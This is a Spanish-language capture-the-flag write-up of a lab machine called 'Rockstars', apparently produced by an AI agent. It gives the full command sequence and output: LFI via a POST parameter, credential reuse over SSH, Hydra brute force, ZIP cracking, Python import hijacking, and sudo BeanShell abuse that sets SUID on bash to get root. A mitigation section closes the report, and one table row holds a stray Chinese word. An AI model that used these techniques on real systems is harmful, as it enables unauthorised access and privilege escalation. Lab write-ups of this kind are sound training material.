# Informe de Explotación - Máquina "Rockstars" (The Hacker Labs)
**IP Objetivo:** 192.168.231.162
**Fecha:** 23 Julio 2026
**Autor:** Kali (opencode)

---

## 1. RESUMEN EJECUTIVO

Se ha comprometido completamente la máquina "Rockstars" obteniendo acceso total desde www-data hasta root mediante 4 movimientos laterales y una escalada final.

**Vectores de ataque utilizados:**
1. LFI POST parámetro `backdoor` → Lectura de `db.php` → Credenciales de usuario `shark`
2. SSH como shark → Binario `bof` escribible con sudo → Escalada a `wvverez`
3. Cracking de ZIP (`zip2john` + John) → Fuerza bruta SSH (Hydra) → Acceso como `loseey`
4. PATH hijacking en Python (`psutil.py`) + sudo → Escalada a `username3`
5. BeanShell (`bsh`) con sudo → `exec("chmod +s /bin/bash")` → Escalada a root

**Cadena de compromiso:** shark → wvverez → loseey → username3 → root

---

## 2. RECONOCIMIENTO INICIAL

### 2.1 Descubrimiento de host
```bash
sudo netdiscover -r 192.168.231.0/24
```

**Resultado:** Se localizó la máquina objetivo en `192.168.231.162`.

### 2.2 Escaneo de puertos (Nmap)
```bash
nmap -sCV -p- 192.168.231.162 -Pn -vvv -oA rockstars
```

**Resultado:**
| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 22/tcp | Open | SSH | OpenSSH 9.2p1 Debian 2+deb12u3 |
| 80/tcp | Open | HTTP | Apache httpd 2.4.62 (Debian) |

**Por qué:** Identificar superficie de ataque. Puertos 22 y 80 abiertos. Web en puerto 80 es vector principal.

---

## 3. ENUMERACIÓN WEB

### 3.1 Fuzzing de directorios (Gobuster)
```bash
gobuster dir -u http://192.168.231.162/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40
```

**Resultado:**
| Archivo | Status | Tamaño |
|---------|--------|--------|
| **db.php** | 200 | 0 |
| index.php | 500 | 19 |
| index.html | 200 | 0 |
| javascript/ | 301 | 323 |

**Por qué:** `db.php` devuelve 200 OK con tamaño 0 — archivo de configuración que no imprime salida. `index.php` devuelve 500 con 19 bytes ("Yo no soy tu marido").

### 3.2 Descubrimiento del parámetro vulnerable (LFI POST)
```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u "http://192.168.231.162/index.php" -d "FUZZ=/etc/passwd" -H "Content-Type: application/x-www-form-urlencoded" -fs 19
```

**Resultado:**
```
backdoor [Status: 200, Size: 1575, Words: 12, Lines: 31, Duration: 219ms]
```

**Parámetro vulnerable:** `backdoor` (vía POST). El filtro `-fs 19` descartó el ruido (respuestas de 19 bytes).

### 3.3 Lectura de db.php vía LFI
```bash
curl -XPOST http://192.168.231.162/index.php -d "backdoor=/var/www/html/db.php"
```

**Resultado:**
```
Yo no soy tu marido<?php
$usuario = "shark";
$contrasena = "djbasdnbasdas&$AAAALLthl"; 
?>
```

**Credenciales obtenidas:**
- **Usuario:** `shark`
- **Contraseña:** `djbasdnbasdas&$AAAALLthl`

### 3.4 Lectura de /etc/passwd
```bash
curl -XPOST http://192.168.231.162/index.php -d "backdoor=/etc/passwd"
```

**Usuarios con shell bash:**
```
root:x:0:0:root:/root:/bin/bash
shark:x:1001:1001:shark,,,:/home/shark:/bin/bash
wvverez:x:1002:1002:wvverez,,,:/home/wvverez:/bin/bash
loseey:x:1000:1000:loseey,,,:/home/loseey:/bin/bash
username3:x:1003:1003:usernam3,,,:/home/username3:/bin/bash
```

---

## 4. ACCESO INICIAL

### 4.1 SSH como shark
```bash
ssh shark@192.168.231.162
# Contraseña: djbasdnbasdas&$AAAALLthl
```

**Resultado:**
```
shark@TheHackersLabs-RockstarS:~$ whoami
shark
```

### 4.2 User Flag
```bash
cat /home/shark/user.txt
# [FLAG_USER]
```

### 4.3 Persistencia con clave RSA
```bash
ssh-keygen -t rsa -b 2048 -f /tmp/shark_key -N ""
ssh-copy-id -i /tmp/shark_key shark@192.168.231.162
ssh -i /tmp/shark_key shark@192.168.231.162
```

---

## 5. ENUMERACIÓN POST-EXPLOTACIÓN

### 5.1 Verificación de sudo (shark)
```bash
sudo -l
```

**Resultado:**
```
User shark may run the following commands on TheHackersLabs-RockstarS:
 (wvverez) NOPASSWD: /home/shark/bof
```

### 5.2 Análisis del binario bof
```bash
file bof
# bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, not stripped

ls -la bof
# -rwxr-xr-x 1 shark shark 7348 mar 8 10:47 bof
```

**Análisis:** `bof` es un ELF de 32 bits. Shark tiene permisos de escritura sobre él (owner).

---

## 6. MOVIMIENTO LATERAL: shark → wvverez

### 6.1 Explotación del binario escribible
```bash
echo "bash" > bof
sudo -u wvverez /home/shark/bof
```

**Resultado:**
```
wvverez@TheHackersLabs-RockstarS:/home/shark$ whoami
wvverez
```

**Por qué:** En vez de un buffer overflow, se sobrescribe el binario por `bash`. Al ejecutarse como `wvverez`, la shell es de `wvverez`.

### 6.2 Enumeración en /home/wvverez
```bash
ls -la
# -rw-r--r-- 1 root root 366 mar 12 17:45 rubiales.zip
```

---

## 7. MOVIMIENTO LATERAL: wvverez → loseey

### 7.1 Cracking de ZIP
```bash
# Transferir ZIP
python3 -m http.server 8000
wget http://192.168.231.162:8000/rubiales.zip

# Extraer hash
zip2john rubiales.zip > hash.txt

# Crackear con John
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Resultado:** Contraseña: `princess`

### 7.2 Contenido del ZIP
```bash
unzip rubiales.zip
cat passwords.txt
```

**Resultado:** 13 contraseñas obtenidas.

### 7.3 Fuerza bruta SSH (Hydra)
```bash
echo -e "shark\nwvverez\nloseey\nusername3" > users.txt
hydra -L users.txt -P passwords.txt ssh://192.168.231.162 -u -f -t 4
```

**Resultado:**
```
[22][ssh] host: 192.168.231.162 login: loseey password: kmdalskdmasdnmaskj126
```

### 7.4 SSH como loseey
```bash
ssh loseey@192.168.231.162
# Contraseña: kmdalskdmasdnmaskj126
```

---

## 8. MOVIMIENTO LATERAL: loseey → username3

### 8.1 Verificación de sudo (loseey)
```bash
sudo -l
```

**Resultado:**
```
User loseey may run the following commands on TheHackersLabs-RockstarS:
 (username3) NOPASSWD: /usr/bin/python3 /home/loseey/rubiales.py
```

### 8.2 Análisis del script rubiales.py
```bash
cat rubiales.py
```

```python
import psutil

def print_virtual_memory():
 vm = psutil.virtual_memory()
 print(f"Total: {vm.total} Available: {vm.available}")

if __name__ == "__main__":
 print_virtual_memory()
```

### 8.3 PATH Hijacking
```bash
cat > psutil.py << 'EOF'
import os
os.system("bash")
EOF

sudo -u username3 /usr/bin/python3 /home/loseey/rubiales.py
```

**Resultado:**
```
username3@TheHackersLabs-RockstarS:/home/loseey$ whoami
username3
```

**Por qué:** Python busca imports en el directorio actual primero (PATH). Al colocar `psutil.py` malicioso, se ejecuta nuestro código. La shell se ejecuta como `username3`.

---

## 9. ESCALADA A ROOT: username3 → root

### 9.1 Verificación de sudo (username3)
```bash
sudo -l
```

**Resultado:**
```
User username3 may run the following commands on TheHackersLabs-RockstarS:
 (root) NOPASSWD: /usr/bin/bsh
```

### 9.2 Explotación de BeanShell (bsh)
```bash
sudo /usr/bin/bsh
```

**Salida:**
```
BeanShell 2.0b4 - by Pat Niemeyer
bsh % exec("chmod +s /bin/bash");
bsh % <Ctrl+D para salir>
bash -p
```

**Resultado:**
```
bash-5.2# whoami
root
bash-5.2# cat /root/root.txt
[FLAG_ROOT]
```

**Por qué:** `bsh` (BeanShell) es un intérprete Java, no bash. Sintaxis: `exec("comando");`. `chmod +s /bin/bash` pone SUID en bash. `bash -p` ejecuta bash con privilegios efectivos de root.

---

## 10. CADENA DE ATAQUE COMPLETA

```
┌─────────────────────────────────────────────────────────────────┐
│ CADENA DE EXPLOTACIÓN │
├─────────────────────────────────────────────────────────────────┤
│ │
│ [1] RECONOCIMIENTO │
│ ┌─ Nmap ──────────────────┐ │
│ │ Puertos: 22(SSH), 80(HTTP) │
│ └─────────────────────────┘ │
│ │ │
│ ▼ │
│ [2] ENUMERACIÓN WEB │
│ ┌─ Gobuster ─────────────┐ ┌─ db.php (0 bytes) ─────────┐ │
│ │ /db.php │────▶│ Credenciales: shark │ │
│ │ /index.php │ │ djbasdnbasdas&$AAAALLthl │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [3] LFI POST │
│ ┌─ ffuf -fs 19 ──────────┐ ┌─ backdoor=/etc/passwd ────┐ │
│ │ Parámetro "backdoor" │────▶│ 4 usuarios bash │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [4] ACCESO INICIAL (SSH) │
│ ┌─ shark@192.168.231.162 ┐ ┌─ [FLAG_USER] ─────────────┐ │
│ │ djbasdnbasdas&$AAAALL │────▶│ User flag obtenida │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [5] LATERAL 1: shark → wvverez │
│ ┌─ echo "bash" > bof ────┐ ┌─ sudo -u wvverez bof ─────┐ │
│ │ Binario bof escribible │────▶│ Shell como wvverez │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [6] LATERAL 2: wvverez → loseey │
│ ┌─ rubiales.zip ─────────┐ ┌─ zip2john + John ─────────┐ │
│ │ ZIP protegido │────▶│ princess + Hydra SSH │ │
│ └─────────────────────────┘ │ loseey:kmdalskdmasdnmaskj │ │
│ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [7] LATERAL 3: loseey → username3 │
│ ┌─ PATH hijacking ───────┐ ┌─ psutil.py malicioso ─────┐ │
│ │ sudo python3 rubiales │────▶│ os.system("bash") │ │
│ └─────────────────────────┘ │ Shell como username3 │ │
│ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [8] ESCALADA A ROOT │
│ ┌─ sudo /usr/bin/bsh ───┐ ┌─ exec("chmod +s /bin/bash")┐ │
│ │ BeanShell (Java) │────▶│ bash -p → ROOT │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [9] FLAGS │
│ ┌────────────────────────────────────────────────────────────┐ │
│ │ USER: [FLAG_USER] │ │
│ │ ROOT: [FLAG_ROOT] │ │
│ └────────────────────────────────────────────────────────────┘ │
│ │
└─────────────────────────────────────────────────────────────────┘
```

---

## 11. VULNERABILIDADES IDENTIFICADAS

| # | Vulnerabilidad | Severidad | Ubicación | Impacto |
|---|----------------|-----------|-----------|---------|
| 1 | LFI en parámetro POST `backdoor` | CRÍTICA | `/index.php` | Lectura de archivos arbitrarios del servidor |
| 2 | Credenciales en texto plano en PHP | ALTA | `/var/www/html/db.php` | Acceso SSH como shark |
| 3 | Binario escribible con sudo NOPASSWD | CRÍTICA | `/home/shark/bof` | Escalada de shark a wvverez |
| 4 | ZIP protegido con contraseñas débiles | MEDIA | `/home/wvverez/rubiales.zip` | Obtención de contraseñas para Hydra |
| 5 | PATH hijacking en script Python | ALTA | `/home/loseey/rubiales.py` | Escalada de loseey a username3 |
| 6 | BeanShell (bsh) con sudo NOPASSWD root | CRÍTICA | `/usr/bin/bsh` | Escalada a root via `exec()` |
| 7 | Sudoers配置过度 permisiva (4 niveles) | ALTA | `/etc/sudoers` | Cadena completa de escalada |

---

## 12. RECOMENDACIONES DE MITIGACIÓN

1. **Sanitizar parámetros POST** — Implementar whitelist de archivos permitidos para el parámetro `backdoor`
2. **No almacenar credenciales en PHP** — Usar variables de entorno o gestores de secretos
3. **Eliminar binarios innecesarios** — `bof` no debería existir en producción; si es necesario, no dar permisos de escritura
4. **Restringir sudo** — Evitar NOPASSWD; limitar a comandos específicos sin posibilidad de shell escape
5. **Auditar permisos de ZIP** — Los archivos comprimidos no deben contener contraseñas en texto plano
6. **Corregir PATH en scripts Python** — Usar rutas absolutas para imports o virtualenv aislado
7. **Eliminar bsh del sistema** — BeanShell no debería estar instalado; si es necesario, no dar sudo sin contraseña
8. **Implementar least privilege** — Cada usuario solo debería tener los permisos mínimos necesarios
9. **Monitorear ejecución de sudo** — Alertar sobre uso inusual de sudoers

---

## 13. COMANDOS CLAVE UTILIZADOS

```bash
# Reconocimiento
sudo netdiscover -r 192.168.231.0/24
nmap -sCV -p- 192.168.231.162 -Pn -vvv -oA rockstars

# Enumeración web
gobuster dir -u http://192.168.231.162/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40
ffuf -w /usr/share/wordlists/dirb/common.txt -u "http://192.168.231.162/index.php" -d "FUZZ=/etc/passwd" -H "Content-Type: application/x-www-form-urlencoded" -fs 19

# LFI
curl -XPOST http://192.168.231.162/index.php -d "backdoor=/var/www/html/db.php"
curl -XPOST http://192.168.231.162/index.php -d "backdoor=/etc/passwd"

# Acceso inicial
ssh shark@192.168.231.162

# Lateral 1: shark → wvverez
echo "bash" > bof
sudo -u wvverez /home/shark/bof

# Lateral 2: wvverez → loseey
zip2john rubiales.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -L users.txt -P passwords.txt ssh://192.168.231.162 -u -f -t 4
ssh loseey@192.168.231.162

# Lateral 3: loseey → username3
cat > psutil.py << 'EOF'
import os
os.system("bash")
EOF
sudo -u username3 /usr/bin/python3 /home/loseey/rubiales.py

# Escalada a root
sudo /usr/bin/bsh
# Dentro de bsh:
exec("chmod +s /bin/bash");
# Ctrl+D, luego:
bash -p
```

---

## 14. EVIDENCIAS DE COMPROMISO

```
┌────────────────────────────────────────────────────────────┐
│ FLAGS OBTENIDAS │
├────────────────────────────────────────────────────────────┤
│ USER (shark): [FLAG_USER] │
│ ROOT: [FLAG_ROOT] │
└────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────┐
│ ACCESOS LOGRADOS │
├────────────────────────────────────────────────────────────┤
│ ✓ SSH como shark (LFI → db.php → credenciales) │
│ ✓ Escalada a wvverez (binario bof escribible + sudo) │
│ ✓ Escalada a loseey (zip2john + John + Hydra SSH) │
│ ✓ Escalada a username3 (PATH hijacking psutil.py) │
│ ✓ Escalada a root (BeanShell exec → chmod +s /bin/bash) │
└────────────────────────────────────────────────────────────┘
```

---

**FIN DEL INFORME**
